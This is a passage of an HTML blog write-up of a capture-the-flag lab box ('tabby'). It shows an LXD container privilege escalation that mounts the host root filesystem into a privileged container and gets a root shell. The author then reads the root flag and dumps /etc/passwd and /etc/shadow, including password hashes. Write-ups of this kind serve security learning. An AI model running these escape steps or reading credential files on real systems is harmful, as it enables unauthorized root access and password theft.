Length: <span style="color:#ae81ff">3208150</span> <span style="color:#f92672">(</span>3.1M<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>application/octet-stream<span style="color:#f92672">]</span>
Saving to: ‚Äòalpine‚Äô

alpine              100%<span style="color:#f92672">[===================</span>&gt;<span style="color:#f92672">]</span>   3.06M  4.90MB/s    in 0.6s    

2020-07-20 19:49:50 <span style="color:#f92672">(</span>4.90 MB/s<span style="color:#f92672">)</span> - ‚Äòalpine‚Äô saved <span style="color:#f92672">[</span>3208150/3208150<span style="color:#f92672">]</span>

</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ash@tabby:~/.tmp$ ls                                                                         
ls
alpine
</code></pre></div><p>Importing the file <em>alpine</em> with the alias <em>liquid</em></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ash@tabby:~/.tmp$ lxc image import ./alpine --alias liquid 
</code></pre></div><p>Creating a new container with privileged=true</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ash@tabby:~/.tmp$ lxc init liquid -c security.privileged<span style="color:#f92672">=</span>true                                                    
lxc init liquid -c security.privileged<span style="color:#f92672">=</span>true
Creating the instance
Instance name is: moral-mammal
</code></pre></div><p>Checking if it is running:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ash@tabby:~/.tmp$ lxc list
lxc list
+--------------+---------+--------------------+-----------------------------------------------+-----------+-----------+
|     NAME     |  STATE  |        IPV4        |                     IPV6                      |   TYPE    | SNAPSHOTS |
+--------------+---------+--------------------+-----------------------------------------------+-----------+-----------+
| ignite       | RUNNING | 10.89.95.44 <span style="color:#f92672">(</span>eth0<span style="color:#f92672">)</span> | fd42:338a:8d74:e625:216:3eff:fed1:70b5 <span style="color:#f92672">(</span>eth0<span style="color:#f92672">)</span> | CONTAINER | <span style="color:#ae81ff">0</span>         |
+--------------+---------+--------------------+-----------------------------------------------+-----------+-----------+
| moral-mammal | STOPPED |                    |                                               | CONTAINER | <span style="color:#ae81ff">0</span>         |
+--------------+---------+--------------------+-----------------------------------------------+-----------+-----------+
</code></pre></div><p>Here is the abuse, mounting the host filesystem&hellip; / to the path /mnt/root</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">lxc config device add ignite mydevice disk source<span style="color:#f92672">=</span>/ path<span style="color:#f92672">=</span>/mnt/root recursive<span style="color:#f92672">=</span>true
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">lxc start ignite
</code></pre></div><p>Finally getting the shell as root:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">lxc exec ignite /bin/sh
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">~ <span style="color:#75715e"># whoami</span>  
whoami
root
</code></pre></div><p>Great rooted</p>
<p>I went to get the root flag&hellip; I forgot the path!</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">~ <span style="color:#75715e"># cat /root/root.txt</span>
cat /root/root.txt
cat: can<span style="color:#e6db74">&#39;t open &#39;</span>/root/root.txt<span style="color:#960050;background-color:#1e0010">&#39;</span>: No such file or directory
</code></pre></div><p>But no panic the loot was inside the mount point:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/mnt/root/root <span style="color:#75715e"># cat root.txt</span>
cat root.txt
1cd5<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>edaec

</code></pre></div><p>Keeping this in mind is simple to get the /etc/shadow and /etc/passwd to get all the passwords</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/mnt/root/etc <span style="color:#75715e"># cat passwd</span>
cat passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System <span style="color:#f92672">(</span>admin<span style="color:#f92672">)</span>:/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
tomcat:x:997:997::/opt/tomcat:/bin/false
mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
ash:x:1000:1000:clive:/home/ash:/bin/bash
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/mnt/root/etc <span style="color:#75715e"># cat shadow</span>
cat shadow
root:$6$86Nxy4plrFeu0w4C$IfFB5j7BEbjBrUOtkmxyfUZ0lnNIxAcFn3meuvjGqFPSIogXynKx9FU1w3XJIC60rvwuKcg6feaeBqcNWMO0H/:18429:0:99999:7:::
daemon:*:18375:0:99999:7:::
bin:*:18375:0:99999:7:::
sys:*:18375:0:99999:7:::
sync:*:18375:0:99999:7:::
games:*:18375:0:99999:7:::
man:*:18375:0:99999:7:::
lp:*:18375:0:99999:7:::
mail:*:18375:0:99999:7:::
news:*:18375:0:99999:7:::
uucp:*:18375:0:99999:7:::
proxy:*:18375:0:99999:7:::
www-data:*:18375:0:99999:7:::
backup:*:18375:0:99999:7:::
list:*:18375:0:99999:7:::
irc:*:18375:0:99999:7:::
gnats:*:18375:0:99999:7:::
nobody:*:18375:0:99999:7:::
systemd-network:*:18375:0:99999:7:::
systemd-resolve:*:18375:0:99999:7:::
systemd-timesync:*:18375:0:99999:7:::
messagebus:*:18375:0:99999:7:::
syslog:*:18375:0:99999:7:::
_apt:*:18375:0:99999:7:::
tss:*:18375:0:99999:7:::
uuidd:*:18375:0:99999:7:::
tcpdump:*:18375:0:99999:7:::
landscape:*:18375:0:99999:7:::
pollinate:*:18375:0:99999:7:::
sshd:*:18401:0:99999:7:::
systemd-coredump:!!:18401::::::
lxd:!:18401::::::
tomcat:!:18401::::::
mysql:!:18403:0:99999:7:::
ash:$6$XDCNw9I21JdbbjO/$BbIiIM2ovm63Mp05s1Ym156U.agxDqQ4u3AEw//d.55vXvY5sIr7/6Tx5nC2558lIHzlmoX3AGi2Sb2YdMBT21:18429:0:99999:7:::
</code></pre></div><p>Thanks for reading!</p>
</div>

  </article>
</main>
<footer>
  <div>
    <nav class="footer-menu"><a href="https://github.com/u915">GitHub</a><a href="https://www.linkedin.com/in/daniel-canomerchan">Linkedin</a><a href="/posts/index.xml">RSS</a><a href="/sitemap.xml">Sitemap</a></nav>
    <div>¬© 2020 ‚Äî u915 ‚Äî <a href="/license/">License</a></div>
  </div>
</footer>
</body>
</html>
